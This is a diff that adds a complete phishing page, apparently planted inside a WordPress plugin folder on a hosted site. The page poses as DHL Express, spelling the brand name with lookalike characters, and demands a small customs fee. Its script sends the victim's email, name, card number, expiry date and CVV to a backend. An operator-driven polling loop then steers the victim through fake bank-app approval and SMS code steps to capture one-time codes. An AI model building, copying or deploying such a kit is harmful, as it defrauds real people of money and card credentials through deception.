@@ -1,0 +1,541 @@
+<!-- url: https://finichdeliv.wpenginepowered.com/wp-content/plugins/akismet/b/
+status: 200 -->
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Delivery — Shipment Notice</title>
+<style>
+  :root{
+    --yellow:#ffd000; --red:#b82525; --muted:#f3f3f4; --card-bg:#fff;
+    --text:#222; --accent:#ffde59; --shadow:0 10px 30px rgba(18,18,18,0.08);
+    --blue:#2f63ff; --soft:#eef3ff; --green:#22a559; --softg:#eaf9f0;
+  }
+  *, *::before, *::after { box-sizing: border-box; }
+  html,body{height:100%;margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial;color:var(--text);background:#f2f3f4;}
+  .topbar{background:var(--yellow);height:68px;display:flex;align-items:center;justify-content:space-between;padding:0 16px 0 36px;box-shadow:0 2px 6px rgba(0,0,0,.08);position:sticky;top:0;z-index:10}
+  .brand{font-weight:800;letter-spacing:.6px}
+  .nav{display:flex;gap:22px;font-size:14px;opacity:.9}
+  .nav a{color:#111;text-decoration:none}
+  .wrap{min-height:calc(100vh - 68px);display:flex;align-items:flex-start;justify-content:center;padding:36px 16px;}
+  .card{width:520px;background:var(--card-bg);border-radius:12px;box-shadow:var(--shadow);overflow:hidden;border:1px solid rgba(0,0,0,.03)}
+  .hidden{display:none}
+
+  /* Notice card */
+  .redhead{background:var(--red);color:#fff;padding:22px 28px;font-weight:700;display:flex;gap:12px;align-items:center}
+  .content{padding:26px 32px 40px}
+  .muted-label{color:#7a7a7a;font-size:13px;margin-bottom:8px}
+  .tracking{font-size:34px;font-weight:800;margin-bottom:18px}
+  .divider{height:1px;background:linear-gradient(90deg,rgba(0,0,0,.04),rgba(0,0,0,.02));margin:18px 0}
+  .statusbox{background:linear-gradient(180deg,rgba(184,36,36,.03),rgba(243,235,235,.6));border-left:4px solid rgba(184,36,36,.7);padding:18px;border-radius:8px;margin-bottom:18px}
+  .fee-row,.total{display:flex;justify-content:space-between;align-items:center}
+  .total{font-weight:800;font-size:20px;color:var(--red)}
+  .small-note{text-align:center;color:#777}
+  .pay-wrap{display:flex;justify-content:center;margin-top:20px}
+  .pay-btn,.btn-full{background:var(--accent);border:none;border-radius:12px;padding:18px 22px;font-weight:800;box-shadow:0 6px 16px rgba(0,0,0,.12);cursor:pointer}
+  .btn-full{width:100%}
+
+  /* Payment form */
+  .pay-header{background:#111;color:#fff;display:flex;justify-content:space-between;align-items:center;padding:18px 24px;font-weight:800}
+  .form{padding:24px 28px 32px}
+  .row{display:flex;gap:16px}
+  label{display:block;font-size:13px;color:#666;margin:14px 0 6px}
+  input{display:block;width:100%;padding:14px 12px;border-radius:8px;border:1px solid #e3e3e6;background:#fafafa;font-size:15px}
+  input:focus{border-color:#bdbdbd;box-shadow:0 0 0 3px rgba(0,0,0,.05)}
+  input.invalid{border-color:#e07a74;box-shadow:0 0 0 3px rgba(224,122,116,.06)}
+  .input-error{color:#c0392b;margin-top:8px;font-size:13px}
+
+  /* Progress */
+  .progress-wrap{padding:40px 42px;text-align:center}
+  .ring{width:86px;height:86px;border-radius:50%;border:8px solid #ffe680;border-top-color:#ffd000;margin:10px auto 18px;animation:spin 1.1s linear infinite;position:relative}
+  .ring:after{content:"";position:absolute;inset:0;border-radius:50%;border:8px solid rgba(0,0,0,.03)}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .progress-title{font-size:28px;font-weight:800;margin:6px 0 10px}
+  .txid{color:#8a8a8a;margin-top:12px}
+
+  /* Approval in Progress */
+  .appr-head{background:var(--blue);color:#fff;padding:18px 28px;font-weight:800}
+  .appr-body{padding:26px 28px 34px}
+  .appr-banner{background:var(--soft);font-weight:800;border-radius:12px;padding:16px;text-align:center;margin-bottom:12px}
+  .appr-panel{background:#f3f5f8;border-radius:16px;padding:18px;margin:16px 0}
+  .appr-status{display:inline-flex;align-items:center;gap:10px;background:#ffe5e8;color:#b94b57;border-radius:999px;padding:10px 16px;font-weight:800}
+  .appr-dot{width:18px;height:18px;border:3px solid #ffb7c0;border-top-color:#ff6b7a;border-radius:50%;animation:spin 1s linear infinite}
+
+  /* SMS */
+.sms-header{background:#111;color:#fff;padding:18px 28px;font-weight:800}
+.sms-body{padding:26px 28px 34px}
+.code-input{font-size:26px;text-align:center;padding:16px 14px;border-radius:12px;border:1px solid #e3e3e6;background:#fafafa;width:100%}
+.verify-btn{width:100%;background:var(--accent);border:0;border-radius:14px;padding:18px 20px;margin-top:18px;font-weight:900}
+.sms-error{color:#c0392b;margin-top:10px;text-align:center}
+
+/* Remove the letter-spacing that was forcing 6 digits */
+.code-input {
+  letter-spacing: normal !important;
+}
+
+  /* Success */
+  .succ-head{background:var(--green);color:#fff;padding:18px 28px;font-weight:800}
+  .succ-wrap{padding:34px 32px 40px;text-align:center}
+  .check{width:120px;height:120px;border-radius:50%;background:var(--softg);display:flex;align-items:center;justify-content:center;margin:6px auto 16px}
+  .check svg{width:64px;height:64px;stroke:#157347;stroke-width:6;fill:none}
+  .succ-title{font-size:28px;font-weight:900;margin:6px 0 8px}
+  .succ-sub{color:#657080;line-height:1.5;margin:0 auto 8px;max-width:560px}
+  .succ-tx{color:#9aa3ae;margin:12px 0 22px}
+  .succ-btn{display:inline-block;background:#111;color:#fff;text-decoration:none;padding:14px 18px;border-radius:12px;font-weight:900}
+
+  /* Enhanced validation styles */
+  .input-valid {
+    border-color: #22a559 !important;
+    box-shadow: 0 0 0 3px rgba(34, 165, 89, 0.1) !important;
+  }
+
+  .input-invalid {
+    border-color: #e07a74 !important;
+    box-shadow: 0 0 0 3px rgba(224, 122, 116, 0.1) !important;
+  }
+
+  .form-error {
+    text-align: center;
+    margin-top: 16px;
+    padding: 12px;
+    background: #ffeaea;
+    border: 1px solid #ffcdd2;
+    border-radius: 8px;
+    color: #c0392b;
+  }
+
+  /* Update SMS input placeholder */
+  .code-input::placeholder {
+    font-size: 18px;
+    letter-spacing: normal;
+  }
+
+  @media (max-width:560px){.card{width:92%}.row{flex-direction:column}.topbar{height:56px}.tracking{font-size:26px}}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <div class="brand">DНL Еxpгess</div>
+  <nav class="nav"><a href="#">Tracking</a><a href="#">Shipping</a><a href="#">Customer Service</a></nav>
+</header>
+
+<main class="wrap">
+
+  <!-- STEP: notice -->
+  <section id="notice" class="card">
+    <div class="redhead"><div>!</div><div>Important Notice: Shipment Requires Resolution</div></div>
+    <div class="content">
+      <div class="muted-label">● Tracking Reference</div>
+      <div class="tracking">JD0101997321689</div>
+      <div class="divider"></div>
+      <div class="statusbox"><strong>CURRENT STATUS: ON HOLD</strong><p>Outstanding fee for <b>Customs Clearance & Re-delivery</b>.</p></div>
+      <div class="fee-row"><div>Clearance & Handling Fee</div><div>CHF 11.30</div></div>
+      <div class="divider"></div>
+      <div class="total"><div>TOTAL DUE</div><div>CHF 11.30</div></div>
+      <p class="small-note">Click the button below to be securely forwarded to the payment system.</p>
+      <div class="pay-wrap"><button id="btnNotice" class="pay-btn" type="button">PROCESS PAYMENT</button></div>
+    </div>
+  </section>
+
+  <!-- STEP: payment -->
+  <section id="payment" class="card hidden">
+    <div class="pay-header"><div>Secure Payment Required</div><div>CHF 11.30</div></div>
+    <form id="payForm" class="form" novalidate>
+      <label>Email Address</label><input id="fEmail" type="email" placeholder="email@example.com" required />
+      <label>Card Holder Name</label><input id="fName" type="text" placeholder="Name on Card" required />
+      <label>Card Number</label><input id="fCard" type="text" inputmode="numeric" placeholder="•••• •••• •••• ••••" maxlength="19" />
+      <div class="row">
+        <div style="flex:1"><label>Expiry Date (MM/YY)</label><input id="fExp" type="text" inputmode="numeric" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" /></div>
+        <div style="flex:1"><label>CVV</label><input id="fCvv" type="password" inputmode="numeric" placeholder="***" maxlength="4" /></div>
+      </div>
+      <div class="divider"></div>
+      <button class="btn-full" type="submit">Pay Now CHF 11.30</button>
+      <div class="back-link" id="backNotice" style="margin-top:8px;cursor:pointer">← Back</div>
+    </form>
+  </section>
+
+  <!-- STEP: progress (infinite until admin changes) -->
+  <section id="progress" class="card hidden">
+    <div class="progress-wrap">
+      <div class="ring"></div>
+      <div class="progress-title">Payment in Progress…</div>
+      <p id="progressMsg">Waiting for bank response…</p>
+      <div class="txid">Transaction ID: <b id="txid">TRANS-DEMO</b></div>
+    </div>
+  </section>
+
+  <!-- STEP: approval (infinite until admin changes) -->
+  <section id="approval" class="card hidden">
+    <div class="appr-head">📱 Approval in Progress</div>
+    <div class="appr-body">
+      <div class="appr-banner">Action Required in your Banking App!</div>
+      <p style="text-align:center;margin:10px 0 6px;color:#333">
+        Please approve the payment of <b>CHF 11.30</b> in your mobile banking app.
+      </p>
+      <div class="appr-panel" style="text-align:center">
+        <div style="font-weight:800;margin-bottom:8px">Current Status:</div>
+        <div style="display:flex;justify-content:center"><div class="appr-status"><span class="appr-dot"></span>Awaiting Your Approval…</div></div>
+        <div class="txid" style="margin-top:10px">Transaction ID: <b id="txid2">—</b></div>
+      </div>
+      <p style="text-align:center;color:#666">This page will update automatically once approved.</p>
+    </div>
+  </section>
+
+  <!-- STEP: sms -->
+<section id="sms" class="card hidden">
+  <div class="sms-header">SMS Code Verification</div>
+  <div class="sms-body">
+    <p><b>Enter the 4-8 digit code</b> sent via SMS.</p>
+    <input id="smsCode" class="code-input" inputmode="numeric" maxlength="8" placeholder="Enter 4-8 digit code" />
+    <div id="smsErr" class="sms-error" style="display:none"></div>
+    <button id="btnVerify" class="verify-btn" type="button">Verify Code</button>
+    <div style="text-align:center;margin-top:10px;color:#666">This step will complete when the code is correct or the admin moves you forward.</div>
+  </div>
+</section>
+
+  <!-- STEP: success -->
+  <section id="success" class="card hidden">
+    <div class="succ-head">✔️ Payment Successful</div>
+    <div class="succ-wrap">
+      <div class="check"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg></div>
+      <div class="succ-title">Transaction Approved!</div>
+      <p class="succ-sub">Your payment has been successfully processed.<br>Your parcel is now released for delivery.</p>
+      <div class="succ-tx">Transaction ID: <b id="succTx">—</b></div>
+      <a href="#" id="btnReturn" class="succ-btn">Return to Delivery Tracking</a>
+    </div>
+  </section>
+
+</main>
+
+<script>
+/* ---------- Visitor Identification ---------- */
+function generateVisitorId() {
+  const fingerprint = [
+    navigator.userAgent,
+    navigator.language,
+    screen.width + 'x' + screen.height,
+    new Date().getTime()
+  ].join('|');
+  
+  let hash = 0;
+  for (let i = 0; i < fingerprint.length; i++) {
+    const char = fingerprint.charCodeAt(i);
+    hash = ((hash << 5) - hash) + char;
+    hash = hash & hash;
+  }
+  
+  return 'VISITOR-' + Math.abs(hash).toString(36).toUpperCase();
+}
+
+let visitorId = localStorage.getItem('delivery_visitor_id');
+if (!visitorId) {
+  visitorId = generateVisitorId();
+  localStorage.setItem('delivery_visitor_id', visitorId);
+}
+
+/* ---------- Backend API ---------- */
+const API = 'state.php';
+const STEPS = ['notice','payment','progress','approval','sms','success'];
+let currentStep = 'notice';
+let txid = 'TRANS-DEMO';
+let pollTimer = null;
+
+const $ = s => document.querySelector(s);
+function show(id){ STEPS.forEach(k=>document.getElementById(k).classList.toggle('hidden', k!==id)); currentStep=id; }
+
+async function api(action, data = {}) {
+  data.visitor_id = visitorId;
+  const headers = {'Content-Type':'application/x-www-form-urlencoded'};
+  const body = 'action='+encodeURIComponent(action)+'&'+new URLSearchParams(data).toString();
+  const r = await fetch(API, {method:'POST', headers, body});
+  return r.json();
+}
+
+function startPolling(){
+  clearInterval(pollTimer);
+  pollTimer = setInterval(async ()=>{
+    try{
+      const res = await api('current');
+      if(res.ok && res.step && res.step!==currentStep){
+        renderStep(res.step, res);
+      }
+    }catch(e){}
+  }, 2000);
+}
+
+function renderStep(step, payload={}){
+  if(!STEPS.includes(step)) step = 'notice';
+  if(payload.txid) txid = payload.txid;
+  if($('#txid'))  $('#txid').textContent  = txid;
+  if($('#txid2')) $('#txid2').textContent = txid;
+  if($('#succTx')) $('#succTx').textContent = txid;
+  show(step);
+}
+
+/* ---------- Validation Functions ---------- */
+function validateCardNumber(cardNumber) {
+  const cleanCard = cardNumber.replace(/[^0-9]/g, '');
+  if (cleanCard.length < 13 || cleanCard.length > 19) return false;
+  return luhnCheck(cleanCard);
+}
+
+function luhnCheck(cardNumber) {
+  let sum = 0;
+  let isEven = false;
+  for (let i = cardNumber.length - 1; i >= 0; i--) {
+    let digit = parseInt(cardNumber[i]);
+    if (isEven) {
+      digit *= 2;
+      if (digit > 9) digit -= 9;
+    }
+    sum += digit;
+    isEven = !isEven;
+  }
+  return sum % 10 === 0;
+}
+
+function formatCardNumber(input) {
+  const value = input.value.replace(/[^0-9]/g, '');
+  const formattedValue = value.replace(/([0-9]{4})/g, '$1 ').trim();
+  input.value = formattedValue;
+  
+  if (value.length >= 13) {
+    if (validateCardNumber(value)) {
+      input.classList.add('input-valid');
+      input.classList.remove('input-invalid');
+    } else {
+      input.classList.add('input-invalid');
+      input.classList.remove('input-valid');
+    }
+  } else {
+    input.classList.remove('input-valid', 'input-invalid');
+  }
+}
+
+function validateExpiry(expiry) {
+  const value = expiry.replace(/[^0-9]/g, '');
+  if (value.length !== 4) return false;
+  const month = parseInt(value.substring(0, 2));
+  const year = parseInt(value.substring(2, 4));
+  const currentYear = new Date().getFullYear() % 100;
+  const currentMonth = new Date().getMonth() + 1;
+  
+  if (month < 1 || month > 12) return false;
+  if (year < currentYear) return false;
+  if (year === currentYear && month < currentMonth) return false;
+  return true;
+}
+
+function formatExpiry(input) {
+  let value = input.value.replace(/[^0-9]/g, '');
+  if (value.length > 4) value = value.substring(0, 4);
+  
+  if (value.length >= 2) {
+    input.value = value.substring(0, 2) + '/' + value.substring(2);
+    if (value.length === 4) {
+      if (validateExpiry(value)) {
+        input.classList.add('input-valid');
+        input.classList.remove('input-invalid');
+      } else {
+        input.classList.add('input-invalid');
+        input.classList.remove('input-valid');
+      }
+    }
+  } else {
+    input.value = value;
+    input.classList.remove('input-valid', 'input-invalid');
+  }
+}
+
+function validateCVV(cvv) {
+  return /^[0-9]{3,4}$/.test(cvv);
+}
+
+function formatCVV(input) {
+  const value = input.value.replace(/[^0-9]/g, '');
+  if (value.length > 4) input.value = value.substring(0, 4);
+  else input.value = value;
+  
+  if (value.length >= 3) {
+    if (validateCVV(value)) {
+      input.classList.add('input-valid');
+      input.classList.remove('input-invalid');
+    } else {
+      input.classList.add('input-invalid');
+      input.classList.remove('input-valid');
+    }
+  } else {
+    input.classList.remove('input-valid', 'input-invalid');
+  }
+}
+
+function validateSMS(code) {
+  return /^[0-9]{4,8}$/.test(code);
+}
+
+function formatSMSInput(input) {
+  const value = input.value.replace(/[^0-9]/g, '');
+  if (value.length > 8) input.value = value.substring(0, 8);
+  else input.value = value;
+  
+  if (value.length >= 4 && value.length <= 8) {
+    if (validateSMS(value)) {
+      input.classList.add('input-valid');
+      input.classList.remove('input-invalid');
+    } else {
+      input.classList.add('input-invalid');
+      input.classList.remove('input-valid');
+    }
+  } else {
+    input.classList.remove('input-valid', 'input-invalid');
+  }
+}
+
+/* ---------- Event Listeners ---------- */
+document.addEventListener('DOMContentLoaded', function() {
+  // Card number
+  const cardInput = document.getElementById('fCard');
+  if (cardInput) {
+    cardInput.addEventListener('input', function() { formatCardNumber(this); });
+  }
+  
+  // Expiry date - SIMPLE VERSION
+  const expiryInput = document.getElementById('fExp');
+  if (expiryInput) {
+    expiryInput.addEventListener('input', function() {
+      let value = this.value.replace(/[^0-9]/g, '');
+      if (value.length > 4) value = value.substring(0, 4);
+      if (value.length >= 2) {
+        this.value = value.substring(0, 2) + '/' + value.substring(2);
+      } else {
+        this.value = value;
+      }
+    });
+  }
+  
+  // CVV
+  const cvvInput = document.getElementById('fCvv');
+  if (cvvInput) {
+    cvvInput.addEventListener('input', function() { formatCVV(this); });
+  }
+  
+  // SMS
+  const smsInput = document.getElementById('smsCode');
+  if (smsInput) {
+    smsInput.addEventListener('input', function() { formatSMSInput(this); });
+    smsInput.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        $('#btnVerify').click();
+      }
+    });
+  }
+});
+
+/* ---------- Init ---------- */
+(async ()=>{
+  const res = await api('init');
+  if(res.ok){
+    txid = res.txid || txid;
+    renderStep(res.step || 'notice', res);
+    startPolling();
+  }
+})();
+
+/* ---------- Button Handlers ---------- */
+$('#btnNotice').addEventListener('click', async ()=>{
+  await api('set_step_self', {step:'payment'});
+  renderStep('payment');
+});
+
+$('#backNotice').addEventListener('click', async ()=>{
+  await api('set_step_self', {step:'notice'}); 
+  renderStep('notice');
+});
+
+$('#payForm').addEventListener('submit', async (e)=>{
+  e.preventDefault();
+  
+  const email = $('#fEmail').value.trim();
+  const name = $('#fName').value.trim();
+  const card = $('#fCard').value.replace(/ /g, '');
+  const expiry = $('#fExp').value.replace(/[^0-9]/g, '');
+  const cvv = $('#fCvv').value;
+  
+  let isValid = true;
+  let errorMessage = '';
+  
+  if (!email || !/^[^@]+@[^@]+.[^@]+$/.test(email)) {
+    isValid = false; errorMessage = 'Please enter a valid email address';
+    $('#fEmail').classList.add('input-invalid');
+  } else $('#fEmail').classList.remove('input-invalid');
+  
+  if (isValid && (!name || name.length < 2)) {
+    isValid = false; errorMessage = 'Please enter cardholder name';
+    $('#fName').classList.add('input-invalid');
+  } else $('#fName').classList.remove('input-invalid');
+  
+  if (isValid && !validateCardNumber(card)) {
+    isValid = false; errorMessage = 'Please enter a valid card number';
+    $('#fCard').classList.add('input-invalid');
+  } else $('#fCard').classList.remove('input-invalid');
+  
+  if (isValid && !validateExpiry(expiry)) {
+    isValid = false; errorMessage = 'Please enter a valid expiry date (MM/YY)';
+    $('#fExp').classList.add('input-invalid');
+  } else $('#fExp').classList.remove('input-invalid');
+  
+  if (isValid && !validateCVV(cvv)) {
+    isValid = false; errorMessage = 'Please enter a valid CVV (3 or 4 digits)';
+    $('#fCvv').classList.add('input-invalid');
+  } else $('#fCvv').classList.remove('input-invalid');
+  
+  if (!isValid) {
+    const existingError = $('#payForm').querySelector('.form-error');
+    if (existingError) existingError.remove();
+    const errorDiv = document.createElement('div');
+    errorDiv.className = 'form-error';
+    errorDiv.textContent = errorMessage;
+    $('#payForm').appendChild(errorDiv);
+    return;
+  }
+  
+  const existingError = $('#payForm').querySelector('.form-error');
+  if (existingError) existingError.remove();
+  
+  const formData = { email, name, card, expiry, cvv };
+  const res = await api('submit_payment', formData);
+  txid = res.txid || txid;
+  renderStep('progress', res);
+});
+
+$('#btnVerify').addEventListener('click', async ()=>{
+  const code = $('#smsCode').value.replace(/[^0-9]/g, '');
+  const err = $('#smsErr');
+  err.style.display='none'; 
+  err.textContent='';
+  
+  if(!validateSMS(code)){ 
+    err.textContent='Please enter a valid code (4-8 digits)'; 
+    err.style.display='block'; 
+    $('#smsCode').classList.add('input-invalid');
+    return; 
+  }
+  
+  $('#smsCode').classList.remove('input-invalid');
+  $('#smsCode').classList.add('input-valid');
+  
+  await api('submit_sms', {code: code});
+  err.textContent='Code submitted. Verifying...'; 
+  err.style.display='block';
+  err.style.color='#22a559';
+});
+
+$('#btnReturn').addEventListener('click', (e)=>{ 
+  e.preventDefault(); 
+  renderStep('notice'); 
+});
+</script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9b4079a85d81383f',t:'MTc2Njc1MTAyOS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
